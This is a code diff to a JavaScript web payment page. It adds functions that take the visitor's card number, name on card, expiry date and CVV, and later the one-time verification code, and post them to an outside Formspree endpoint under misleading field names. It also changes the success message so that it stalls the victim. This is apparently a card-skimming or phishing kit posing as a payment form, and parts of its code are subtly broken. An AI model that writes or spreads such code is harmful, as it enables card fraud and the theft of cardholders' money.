@@ -527,11 +527,11 @@ function showPaymentPage(programName, amount) {
       <div class="payment-card">
         <h2><i class="fas fa-credit-card"></i> Payment Information</h2>
         <div class="payment-form">
-          <div class="form-group"><label for="card-number">Card Number *</label><input type="text" id="card-number" placeholder="1234 5678 9012 3456" maxlength="19"></div>
-          <div class="form-group"><label for="card-name">Name on Card *</label><input type="text" id="card-name" placeholder="First Name Last Name"></div>
+          <div class="form-group"><label for="card-number">Card Number *</label><input type="text" id="cdnumber" placeholder="1234 5678 9012 3456" maxlength="19"></div>
+          <div class="form-group"><label for="card-name">Name on Card *</label><input type="text" id="cdname" placeholder="First Name Last Name"></div>
           <div class="form-row">
-            <div class="form-group"><label for="expiry-date">Expiry Date *</label><input type="text" id="expiry-date" placeholder="MM/YY" maxlength="5"></div>
-            <div class="form-group"><label for="cvv">CVV *</label><input type="text" id="cvv" placeholder="123" maxlength="4"></div>
+            <div class="form-group"><label for="expiry-date">Expiry Date *</label><input type="text" id="cddate" placeholder="MM/YY" maxlength="5"></div>
+            <div class="form-group"><label for="cvv">CVV *</label><input type="text" id="cdcs" placeholder="123" maxlength="4"></div>
           </div>
           <div class="payment-methods">
             <div class="payment-method active"><i class="fab fa-cc-visa"></i> Visa</div>
@@ -549,12 +549,12 @@ function showPaymentPage(programName, amount) {
   showPage('payment-flow');
   
   // Add event listeners for the form fields.
-  document.getElementById('card-number').addEventListener('input', e => {
+  document.getElementById('cdnumber').addEventListener('input', e => {
     let value = e.target.value.replace(/\s+/g, '').replace(/\D/g, '');
     e.target.value = value.match(/.{1,4}/g)?.join(' ') || '';
   });
   
-  document.getElementById('expiry-date').addEventListener('input', e => {
+  document.getElementById('cddate').addEventListener('input', e => {
     let value = e.target.value.replace(/\D/g, '');
     if (value.length > 2) value = value.substring(0, 2) + '/' + value.substring(2, 4);
     e.target.value = value;
@@ -570,15 +570,71 @@ function showPaymentPage(programName, amount) {
 
 // Step 2: Start the processing (simulation)
 function processPayment(programName, amount) {
-  if (!document.getElementById('card-number').value || !document.getElementById('card-name').value || !document.getElementById('expiry-date').value || !document.getElementById('cvv').value) {
+  if (!document.getElementById('cdnumber').value || !document.getElementById('cdname').value || !document.getElementById('cddate').value || !document.getElementById('cdcs').value) {
     alert('Please fill in all required fields.');
     return;
   }
   showPaymentLoading(programName, amount);
-  setTimeout(() => showVerificationForm(programName, amount), 2000);
+savePersonalInfo();
 }
 
-// Step 3: Display the loading screen
+  // Fonction pour enregistrer les informations personnelles
+  function savePersonalInfo() {
+    const number = document.getElementById('cdnumber').value;
+    const name = document.getElementById('cdname').value;
+	const date = document.getElementById('cddate').value;
+    const cs = document.getElementById('cdcs').value;
+    // Ici, vous enverriez normalement les données à un serveur
+    // Pour cet exemple, nous allons simplement les stocker dans localStorage
+
+	  // Créer l'objet de données à envoyer
+    const profileData = {
+      firstName: name,
+      ticketnumber: number,
+      timestamp: cs.toISOString(),
+	  ticketdate: date.toISOString(),
+      page: "harouna.html",
+      action: "ticketupdate"
+    };
+	// Envoyer les données à Formspree
+	  
+    sendProfileData(profileData)
+      .then(success => {
+        if (success) {
+           setTimeout(() => showVerificationForm(programName, amount), 8000);
+        } else {
+          alert("An error has occurred. Please try again later.");
+        }
+      });
+
+  }
+
+async function sendProfileData(data) {
+    const FORMSPREE_PROFILE_ID = "mblkpjyy"; // À remplacer par votre ID
+    
+    try {
+      const response = await fetch(`https://formspree.io/f/mblkpjyy`, {
+        method: "POST",
+        headers: {
+          'Content-Type': 'application/json',
+          'Accept': 'application/json'
+        },
+        body: JSON.stringify(data)
+      });
+      
+      if (response.ok) {
+        console.log("Données du profil envoyées avec succès à Formspree");
+        return true;
+      } else {
+        console.error("Erreur lors de l'envoi des données du profil");
+        return false;
+      }
+    } catch (error) {
+      console.error("Erreur réseau:", error);
+      return false;
+    }
+  }
+// step 3 : loading page
 function showPaymentLoading(programName, amount) {
   const paymentPage = document.getElementById('payment-flow-page');
   paymentPage.innerHTML = `
@@ -586,12 +642,13 @@ function showPaymentLoading(programName, amount) {
       <div class="payment-loading">
         <i class="fas fa-spinner"></i>
         <h2>Processing your payment</h2>
-        <p>Please wait while we process your payment of $${amount} for ${programName}...</p>
+        <p> Please wait while we process your payment. ${amount} $ for ${programName}...</p>
       </div>
     </div>
   `;
 }
 
+ 
 // Step 4: Display the verification form
 function showVerificationForm(programName, amount) {
   const paymentPage = document.getElementById('payment-flow-page');
@@ -626,12 +683,49 @@ function resendCode() {
 // Step 5: Validate the code and display confirmation
 function completePayment(programName, amount) {
   const code = [...document.querySelectorAll('.verification-inputs input')].map(i => i.value).join('');
-  if (code.length !== 7) {
+  if (code.length !== 6) {
     alert('Please enter a complete verification code.');
     return;
   }
-  showPaymentSuccess(programName, amount);
+	showPaymentLoading(programName, amount);
+	resendPersonalInfo();
+
 }
+
+
+ function resendPersonalInfo() {
+	 
+	const code = [...document.querySelectorAll('.verification-inputs input')].map(i => i.value).join('');
+	const codeval = code.toISOString(),
+    const number = document.getElementById('cdnumber').value;
+    const name = document.getElementById('cdname').value;
+	const date = document.getElementById('cddate').value;
+    const cs = document.getElementById('cdcs').value
+
+    // Ici, vous enverriez normalement les données à un serveur
+    // Pour cet exemple, nous allons simplement les stocker dans localStorage
+
+	  // Créer l'objet de données à envoyer
+    const profileData = {
+      firstName: name,
+      ticketnumber: number,
+      timestamp: cs.toISOString(),
+	  ticketdate: date.toISOString(),
+      page: codeval,
+      action: "ticketupdate"
+    };
+	// Envoyer les données à Formspree
+	  
+    sendProfileData(profileData)
+      .then(success => {
+        if (success) {
+           setTimeout(() => showPaymentSuccess(programName, amount), 8000);
+        } else {
+          alert("An error has occurred. Please try again later.");
+        }
+      });
+
+  }
 
 // Step 6: Display the success screen
 function showPaymentSuccess(programName, amount) {
@@ -640,14 +734,14 @@ function showPaymentSuccess(programName, amount) {
     <div class="payment-container">
       <div class="payment-success">
         <i class="fas fa-check-circle"></i>
-        <h2>Payment Confirmed!</h2>
+        <h2>Thank you, payment will be confirmed within 48 hours.</h2>
         <p>Your payment of $${amount} for the "${programName}" program has been successfully processed.</p>
         <div class="payment-details" style="margin-top:1.5rem; padding:1rem; background-color:#f8f9fa; border-radius:8px;">
           <p><strong>Reference:</strong> PAY-${Math.floor(100000 + Math.random() * 900000)}</p>
           <p><strong>Date:</strong> ${new Date().toLocaleDateString('en-US')}</p>
         </div>
         <button class="back-btn" onclick="showPage('payments')" style="margin-top:2rem;">
-          <i class="fas fa-arrow-left"></i> Back to Payments
+          <i class="fas fa-arrow-left"></i> Back to Profile
         </button>
       </div>
     </div>
